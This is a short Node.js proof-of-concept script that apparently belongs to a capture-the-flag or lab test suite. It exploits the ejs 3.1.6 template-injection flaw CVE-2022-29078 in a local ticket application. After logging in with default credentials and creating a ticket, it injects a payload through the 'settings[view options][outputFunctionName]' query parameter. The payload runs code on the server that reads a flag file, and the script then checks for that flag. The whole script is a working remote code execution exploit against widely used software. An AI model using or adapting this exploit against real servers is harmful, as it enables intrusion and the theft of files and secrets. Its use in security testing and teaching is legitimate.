#!/usr/bin/env node
/**
 * PoC V1.2 — ejs@3.1.6 CVE-2022-29078 via settings['view options'].outputFunctionName.
 * Ticket detail render spreads req.query into res.render locals (Express → ejs path).
 * Usage: node ejs-rce.mjs --base http://127.0.0.1:3001 [--user alice] [--pass user123]
 */
import { extractFlag } from '../../../packages/shared/dist/index.js';

function arg(name, fallback) {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 ? process.argv[i + 1] : fallback;
}

const base = arg('base', 'http://127.0.0.1:3001').replace(/\/$/, '');
const user = arg('user', 'alice');
const pass = arg('pass', 'user123');

const loginRes = await fetch(`${base}/api/login`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
  body: JSON.stringify({ username: user, password: pass }),
});
const loginBody = await loginRes.json();
if (!loginRes.ok || !loginBody.token) {
  console.error('FAIL: login', loginRes.status, loginBody);
  process.exit(1);
}
const token = loginBody.token;

const createRes = await fetch(`${base}/api/tickets`, {
  method: 'POST',
  headers: {
    Authorization: `Bearer ${token}`,
    'Content-Type': 'application/json',
    Accept: 'application/json',
  },
  body: JSON.stringify({ title: 'rce-poc', body: 'probe' }),
});
const created = await createRes.json();
if (!createRes.ok) {
  console.error('FAIL: create ticket', createRes.status, created);
  process.exit(1);
}
const ticketId = created.ticket.id;

// CVE-2022-29078: ejs copies settings['view options'] into compile opts (Express path)
const payload =
  "x;return global.process.mainModule.require('fs').readFileSync(global.process.env.FLAG_FILE_PATH||'./flags/app1.flag','utf8');x";

const url =
  `${base}/tickets/${ticketId}` +
  `?settings[view options][outputFunctionName]=${encodeURIComponent(payload)}`;

const rceRes = await fetch(url, {
  headers: {
    Authorization: `Bearer ${token}`,
    Accept: 'text/html',
  },
});
const html = await rceRes.text();
console.log('status', rceRes.status);
console.log(html.slice(0, 300));

const flag = extractFlag(html);
if (!flag) {
  console.error('FAIL: RCE did not return flag (is ejs still 3.1.6?)');
  process.exit(1);
}
console.log('FLAG', flag);
console.log('PASS V1.2 ejs-rce');
